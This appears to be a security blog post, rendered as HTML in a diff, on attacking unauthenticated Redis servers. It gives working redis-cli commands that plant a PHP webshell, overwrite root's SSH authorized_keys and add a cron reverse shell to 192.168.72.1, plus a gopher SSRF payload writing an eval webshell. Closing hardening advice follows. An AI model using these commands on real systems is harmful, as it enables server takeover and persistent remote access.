@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<meta http-equiv="X-UA-Compatible" content="ie=edge">
+	<meta name="theme-color" content="#20293a">
+	<meta name="msapplication-TileColor" content="#20293a">
+<meta itemprop="name" content="Redis Unauthorized Access">
+<meta itemprop="description" content="0x01 前言 REmote DIctionary Server(Redis) 是完全开源免费的，遵守BSD协议，Redis是一个由Salvatore Sanfilippo写的key-value存储系统。
+Redis 与其他它key - value 缓存产品有以下三个特点：
+ Redis支持数据的持久化，可以将内存中的数据保存在磁盘中，重启的时候可以再次加载进行使用。 Redis不仅仅支持简单的key-value类型的数据，同时还提供list，set，zset，hash等数据结构的存储。 Redis支持数据的备份，即master-slave模式的数据备份。  Redis因配置不当可造成未授权访问。攻击者无需通过身份认证便可访问到内部数据，造成敏感信息泄露，也可以恶意执行flushall来清空所有数据。如果Redis以root身份运行，可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器。
+0x02 部署redis # Download wget http://download.redis.io/releases/redis-stable.tar.gz # Decompression tar -zxvf redis-stable.tar.gz # Compile cd redis-stable make # Run cd src sudo ./redis-server #最新版本redis已经默认启动为普通用户 写ssh公钥和定时计划需root用户 0x03 写 Webshell # kali @ kali in ~/redis-stable/src [9:44:29] $ ./redis-cli127.0.0.1:6379&gt; config set dir /var/www/htmlOK127.0.0.1:6379&gt; config set dbfilename hack.phpOK127.0.0.1:6379&gt; set shell &quot;&lt;?php phpinfo(); ?"><meta itemprop="datePublished" content="2021-06-08T21:20:11+08:00" />
+<meta itemprop="dateModified" content="2021-06-08T21:20:11+08:00" />
+<meta itemprop="wordCount" content="279">
+<meta itemprop="keywords" content="" /><meta property="og:title" content="Redis Unauthorized Access" />
+<meta property="og:description" content="0x01 前言 REmote DIctionary Server(Redis) 是完全开源免费的，遵守BSD协议，Redis是一个由Salvatore Sanfilippo写的key-value存储系统。
+Redis 与其他它key - value 缓存产品有以下三个特点：
+ Redis支持数据的持久化，可以将内存中的数据保存在磁盘中，重启的时候可以再次加载进行使用。 Redis不仅仅支持简单的key-value类型的数据，同时还提供list，set，zset，hash等数据结构的存储。 Redis支持数据的备份，即master-slave模式的数据备份。  Redis因配置不当可造成未授权访问。攻击者无需通过身份认证便可访问到内部数据，造成敏感信息泄露，也可以恶意执行flushall来清空所有数据。如果Redis以root身份运行，可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器。
+0x02 部署redis # Download wget http://download.redis.io/releases/redis-stable.tar.gz # Decompression tar -zxvf redis-stable.tar.gz # Compile cd redis-stable make # Run cd src sudo ./redis-server #最新版本redis已经默认启动为普通用户 写ssh公钥和定时计划需root用户 0x03 写 Webshell # kali @ kali in ~/redis-stable/src [9:44:29] $ ./redis-cli127.0.0.1:6379&gt; config set dir /var/www/htmlOK127.0.0.1:6379&gt; config set dbfilename hack.phpOK127.0.0.1:6379&gt; set shell &quot;&lt;?php phpinfo(); ?" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://theoyu.top/posts/redis/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-06-08T21:20:11+08:00" />
+<meta property="article:modified_time" content="2021-06-08T21:20:11+08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Redis Unauthorized Access"/>
+<meta name="twitter:description" content="0x01 前言 REmote DIctionary Server(Redis) 是完全开源免费的，遵守BSD协议，Redis是一个由Salvatore Sanfilippo写的key-value存储系统。
+Redis 与其他它key - value 缓存产品有以下三个特点：
+ Redis支持数据的持久化，可以将内存中的数据保存在磁盘中，重启的时候可以再次加载进行使用。 Redis不仅仅支持简单的key-value类型的数据，同时还提供list，set，zset，hash等数据结构的存储。 Redis支持数据的备份，即master-slave模式的数据备份。  Redis因配置不当可造成未授权访问。攻击者无需通过身份认证便可访问到内部数据，造成敏感信息泄露，也可以恶意执行flushall来清空所有数据。如果Redis以root身份运行，可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器。
+0x02 部署redis # Download wget http://download.redis.io/releases/redis-stable.tar.gz # Decompression tar -zxvf redis-stable.tar.gz # Compile cd redis-stable make # Run cd src sudo ./redis-server #最新版本redis已经默认启动为普通用户 写ssh公钥和定时计划需root用户 0x03 写 Webshell # kali @ kali in ~/redis-stable/src [9:44:29] $ ./redis-cli127.0.0.1:6379&gt; config set dir /var/www/htmlOK127.0.0.1:6379&gt; config set dbfilename hack.phpOK127.0.0.1:6379&gt; set shell &quot;&lt;?php phpinfo(); ?"/>
+
+	<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+	<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+	<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+	<link rel="manifest" href="/site.webmanifest">
+	<link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+	<link rel="shortcut icon" href="/favicon.ico">
+
+	<title>Redis Unauthorized Access</title>
+	<link rel="stylesheet" href="https://theoyu.top/css/style.min.948bbb56de2e03535e20f1dcdeada9d463fac9cb3e67a99667928e9208ec6fa8.css" integrity="sha256-lIu7Vt4uA1NeIPHc3q2p1GP6ycs+Z6mWZ5KOkgjsb6g=" crossorigin="anonymous">
+	
+</head>
+
+<body id="page">
+	
+	<header id="site-header" class="animated slideInUp">
+		<div class="hdr-wrapper section-inner">
+			<div class="hdr-left">
+				<div class="site-branding">
+					<a href="https://theoyu.top/">Theoyu&#39;s Blog</a>
+				</div>
+				<nav class="site-nav hide-in-mobile">
+					
+				<a href="https://theoyu.top/posts/">Posts</a>
+				<a href="https://theoyu.top/about-me/">About</a>
+
+				</nav>
+			</div>
+			<div class="hdr-right hdr-icons">
+				<button id="toc-btn" class="hdr-btn desktop-only-ib" title=""><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-list"><line x1="8" y1="6" x2="21" y2="6"></line><line x1="8" y1="12" x2="21" y2="12"></line><line x1="8" y1="18" x2="21" y2="18"></line><line x1="3" y1="6" x2="3" y2="6"></line><line x1="3" y1="12" x2="3" y2="12"></line><line x1="3" y1="18" x2="3" y2="18"></line></svg></button><span class="hdr-social hide-in-mobile"><a href="mailto:zeyu.ou@foxmail.com" target="_blank" rel="noopener me" title="Email"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg></a><a href="https://instagram.com/" target="_blank" rel="noopener me" title="Instagram"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="2" width="20" height="20" rx="5" ry="5"></rect><path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z"></path><line x1="17.5" y1="6.5" x2="17.5" y2="6.5"></line></svg></a><a href="https://github.com/yuuuuu422" target="_blank" rel="noopener me" title="Github"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path></svg></a></span><button id="menu-btn" class="hdr-btn" title=""><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg></button>
+			</div>
+		</div>
+	</header>
+	<div id="mobile-menu" class="animated fast">
+		<ul>
+			<li><a href="https://theoyu.top/posts/">Posts</a></li>
+			<li><a href="https://theoyu.top/about-me/">About</a></li>
+		</ul>
+	</div>
+
+
+	<main class="site-main section-inner animated fadeIn faster">
+		<article class="thin">
+			<header class="post-header">
+				<div class="post-meta"><span>Jun 8, 2021</span></div>
+				<h1>Redis Unauthorized Access</h1>
+			</header>
+			<div class="content">
+				<h2 id="0x01-前言">0x01 前言<a href="#0x01-前言" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+<p><strong>REmote DIctionary Server</strong>(Redis) 是完全开源免费的，遵守BSD协议，Redis是一个由Salvatore Sanfilippo写的key-value存储系统。</p>
+<p>Redis 与其他它key - value 缓存产品有以下三个特点：</p>
+<ul>
+<li>Redis支持数据的持久化，可以将内存中的数据保存在磁盘中，重启的时候可以再次加载进行使用。</li>
+<li>Redis不仅仅支持简单的key-value类型的数据，同时还提供list，set，zset，hash等数据结构的存储。</li>
+<li>Redis支持数据的备份，即master-slave模式的数据备份。</li>
+</ul>
+<p>Redis因配置不当可造成未授权访问。攻击者无需通过身份认证便可访问到内部数据，造成敏感信息泄露，也可以恶意执行flushall来清空所有数据。如果Redis以root身份运行，可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器。</p>
+<h2 id="0x02-部署redis">0x02 部署redis<a href="#0x02-部署redis" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># Download</span>
+wget http://download.redis.io/releases/redis-stable.tar.gz
+<span class="c1"># Decompression</span>
+tar -zxvf redis-stable.tar.gz
+<span class="c1"># Compile</span>
+<span class="nb">cd</span> redis-stable
+make
+<span class="c1"># Run</span>
+<span class="nb">cd</span> src
+
+sudo ./redis-server
+<span class="c1">#最新版本redis已经默认启动为普通用户 写ssh公钥和定时计划需root用户</span>
+</code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/06/2021-06-08-image-20210608213959530.png" alt="image-20210608213959530"></p>
+<h2 id="0x03-写-webshell">0x03 写 Webshell<a href="#0x03-写-webshell" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+<pre><code># kali @ kali in ~/redis-stable/src [9:44:29] 
+$ ./redis-cli
+127.0.0.1:6379&gt; config set dir /var/www/html
+OK
+127.0.0.1:6379&gt;  config set dbfilename hack.php
+OK
+127.0.0.1:6379&gt; set shell &quot;&lt;?php phpinfo(); ?&gt;&quot;
+OK
+127.0.0.1:6379&gt; save
+OK
+</code></pre><pre><code># kali @ kali in /var/www/html [9:46:40] 
+$ cat hack.php 
+REDIS0009�      redis-ver6.0.5�
+�edis-bits�@�ctime�ct�`used-mem�5
+ aof-preamble���shell&lt;?php phpinfo(); ?&gt;xB?
+</code></pre><h2 id="0x04-写入ssh公钥">0x04 写入SSH公钥<a href="#0x04-写入ssh公钥" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+<p>首先我们需要判断redis 服务端是否为root用户启动。如果不是只能在<code>~/.ssh</code>写入(用处比较小)。如果为root权限，我们需要确定<code>/root</code>下是否有<code>.ssh</code>目录，以及<code>etc/ssh/sshd_config </code>下写有<code>PermitRootLogin yes</code>，好在以上两点都可以动过写入计划任务来实现。</p>
+<pre><code>flushall
+set 1 `\n\n\nyour ssh-rsa public key\n\n\n`
+config set dir /root/.ssh/
+config set dbfilename authorized_keys
+save
+</code></pre><h2 id="0x05-crontab-定时任务">0x05 Crontab 定时任务<a href="#0x05-crontab-定时任务" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+<p>这个方法只能<code>Centos</code>上使用，<code>Ubuntu上行不通</code>，原因如下：</p>
+<ol>
+<li>因为默认redis写文件后是644的权限，但ubuntu要求执行定时任务文件<code>/var/spool/cron/crontabs/&lt;username&gt;</code>权限必须是600也就是<code>-rw-------</code>才会执行，否则会报错<code>(root) INSECURE MODE (mode 0600 expected)</code>，而Centos的定时任务文件<code>/var/spool/cron/&lt;username&gt;</code>权限644也能执行</li>
+<li>因为redis保存RDB会存在乱码，在Ubuntu上会报错，而在Centos上不会报错</li>
+</ol>
+<p>由于系统的不同，crontrab定时文件位置也会不同
+Centos的定时任务文件在<code>/var/spool/cron/&lt;username&gt;</code>
+Ubuntu定时任务文件在<code>/var/spool/cron/crontabs/&lt;username&gt;</code></p>
+<pre><code>127.0.0.1:6379&gt; flushall
+OK
+127.0.0.1:6379&gt; set 1 '\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.72.1/12345 0&gt;&amp;1\n\n'
+OK
+127.0.0.1:6379&gt; config set dir /var/spool/cron/
+OK
+127.0.0.1:6379&gt; config set dbfilename root
+OK
+127.0.0.1:6379&gt; save
+OK
+</code></pre><p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/06/2021-06-08-image-20210608221440872.png" alt="image-20210608221440872"></p>
+<h2 id="0x06-redis-rce">0x06 Redis RCE<a href="#0x06-redis-rce" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+<p>留个坑，不是很好理解</p>
+<p><a href="https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf">https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf</a></p>
+<h2 id="0x07-ssrf与redis">0x07 SSRF与Redis<a href="#0x07-ssrf与redis" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+<p>首先我们需要知道Redis服务端与客户端的通信方式：</p>
+<p><code>Redis</code>服务器与客户端通过<code>RESP</code>（<strong>REdis Serialization Protocol</strong>）协议通信。
+RESP协议是在Redis 1.2中引入的，但它成为了与Redis 2.0中的Redis服务器通信的标准方式。这是您应该在Redis客户端中实现的协议。
+RESP实际上是一个支持以下数据类型的序列化协议：简单字符串，错误，整数，批量字符串和数组。</p>
+<p>RESP在Redis中用作请求 - 响应协议的方式如下：</p>
+<ol>
+<li>客户端将命令作为<code>Bulk Strings</code>的RESP数组发送到Redis服务器。</li>
+<li>服务器根据命令实现回复一种RESP类型。</li>
+</ol>
+<p>在RESP中，某些数据的类型取决于第一个字节：
+对于<code>Simple Strings</code>，回复的第一个字节是<code>+</code>
+对于<code>error</code>，回复的第一个字节是<code>-</code>
+对于<code>Integer</code>，回复的第一个字节是<code>:</code>
+对于<code>Bulk Strings</code>，回复的第一个字节是<code>$</code>
+对于<code>array</code>，回复的第一个字节是<code>*</code>
+此外，<code>RESP</code>能够使用稍后指定的<code>Bulk Strings</code>或<code>Array</code>的特殊变体来表示<code>Null</code>值。
+在RESP中，协议的不同部分始终以<code>&quot;\r\n&quot;(CRLF)</code>结束。</p>
+<p>我们通过<strong>wireshake</strong>抓包简单理解以下。</p>
+<pre><code>127.0.0.1:6379&gt; set name theoyu
+OK
+127.0.0.1:6379&gt; get name
+&quot;theoyu&quot;
+</code></pre><p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/06/2021-06-08-image-20210608223621767.png" alt="image-20210608223621767"></p>
+<p><strong>Hex Dump</strong>:</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/06/2021-06-08-image-20210608224917392.png" alt="image-20210608224917392"></p>
+<p>正如前面所说，客户端向将命令作为<code>Bulk Strings</code>的RESP数组发送到Redis服务器，比如第一条指令可认作:<code>[&quot;set&quot;,&quot;name&quot;,&quot;theoyu&quot;]</code>,<code>*3</code>表示数组长度为3，<code>$3</code>表示字符串长度，<code>0d0a</code>也就是<code>\r\n</code>为结束符。</p>
+<p>ok明白了这些，直接构造命令编码，利用gopher协议即可。</p>
+<pre><code>gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2436%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_POST%5B%27theoyu%27%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A
+</code></pre><h2 id="0x08-protection">0x08 Protection<a href="#0x08-protection" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+<p>1.禁止外网访问 Redis。修改 redis.conf 文件，添加或修改，使得 Redis 服务只在当前主机可用：</p>
+<pre><code>bind 127.0.0.1
+</code></pre><p>2.以低权限运行 Redis 服务。</p>
+<p>3.Redis 添加密码验证。修改 redis.conf ，添加：</p>
+<pre><code>requirepass yourpassword
+</code></pre><p>4.禁止一些高危命令。修改 <code>redis.conf</code> 文件，添加如下选项来禁用远程修改 dir/dbfilename。</p>
+<pre><code>rename-command FLUSHALL &quot;&quot;
+rename-command CONFIG &quot;&quot;
+rename-command EVAL &quot;&quot;
+</code></pre><p>5.保证 <code>authorized_keys</code> 文件的安全。为保证安全，阻止其他用户添加新的公钥。将 <code>authorized_keys</code> 的权限设置为对拥有者只读，其他用户没有任何权限：</p>
+<pre><code>chmod 400 ~/.ssh/authorized_keys
+</code></pre><p>为保证 authorized_keys 的权限不会被改掉，还可以设置该文件的 <code>immutable</code> 位权限：</p>
+<pre><code>chattr +i ~/.ssh/authorized_keys
+</code></pre><p>然而，用户还可以重命名 ~/.ssh，然后新建新的 ~/.ssh 目录和 authorized_keys 文件。要避免这种情况，需要设置 ~./ssh 的 immutable 位权限：</p>
+<pre><code>chattr +i ~/.ssh
+</code></pre><p><strong>注</strong>：如果需要添加新的公钥，需要移除 authorized_keys 的 immutable 位权限。然后，添加好新的公钥之后，按照上述步骤重新加上 immutable 位权限。</p>
+<h2 id="0x09-reference">0x09 Reference<a href="#0x09-reference" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+<p><a href="https://xz.aliyun.com/t/5665">https://xz.aliyun.com/t/5665</a></p>
+<p><a href="https://3nd.xyz/2019/11/26/Redis-unauthenticate-exploit.html">https://3nd.xyz/2019/11/26/Redis-unauthenticate-exploit.html</a></p>
+<p><a href="https://xz.aliyun.com/t/5616">https://xz.aliyun.com/t/5616</a></p>
+
+			</div>
+			<hr class="post-end">
+			<footer class="post-info">
+				<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg></p>
+				<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2021-06-08 21:20 &#43;0800</p>
+			</footer>
+		</article>
+		<aside id="toc" class="show-toc">
+			<div class="toc-title"></div>
+			<nav id="TableOfContents">
+  <ul>
+    <li><a href="#0x01-前言">0x01 前言</a></li>
+    <li><a href="#0x02-部署redis">0x02 部署redis</a></li>
+    <li><a href="#0x03-写-webshell">0x03 写 Webshell</a></li>
+    <li><a href="#0x04-写入ssh公钥">0x04 写入SSH公钥</a></li>
+    <li><a href="#0x05-crontab-定时任务">0x05 Crontab 定时任务</a></li>
+    <li><a href="#0x06-redis-rce">0x06 Redis RCE</a></li>
+    <li><a href="#0x07-ssrf与redis">0x07 SSRF与Redis</a></li>
+    <li><a href="#0x08-protection">0x08 Protection</a></li>
+    <li><a href="#0x09-reference">0x09 Reference</a></li>
+  </ul>
+</nav>
+		</aside>
+		<div class="post-nav thin">
+			<a class="next-post" href="https://theoyu.top/posts/codeaudit/lightcms/">
+				<span class="post-nav-label"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-left"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg>&nbsp;</span><br><span>lightcms 1.3.7rce</span>
+			</a>
+			<a class="prev-post" href="https://theoyu.top/posts/laravelrce/">
+				<span class="post-nav-label">&nbsp;<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-right"><line x1="5" y1="12" x2="19" y2="12"></line><polyline points="12 5 19 12 12 19"></polyline></svg></span><br><span>Laravel Debug mode RCE</span>
+			</a>
+		</div>
+		<div id="comments" class="thin">
+</div>
+	</main>
+
+	<footer id="site-footer" class="section-inner thin animated fadeIn faster">
+		<p>&copy; 2021 <a href="https://theoyu.top/">Theoyu</a> &#183; <a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></p>
+		<p>
+			Made with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> &#183; Theme <a href="https://github.com/Track3/hermit" target="_blank" rel="noopener">Hermit</a> &#183; <a href="https://theoyu.top/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a>
+		</p>
+	</footer>
+
+
+
+	<script src="https://theoyu.top/js/bundle.min.7d8545daa55d62427355498dd8da13f98ff79a7938ce7d2a5e2ae1ec0de3beb8.js" integrity="sha256-fYVF2qVdYkJzVUmN2NoT+Y/3mnk4zn0qXirh7A3jvrg=" crossorigin="anonymous"></script>
+	
+
+</body>
+
+</html>
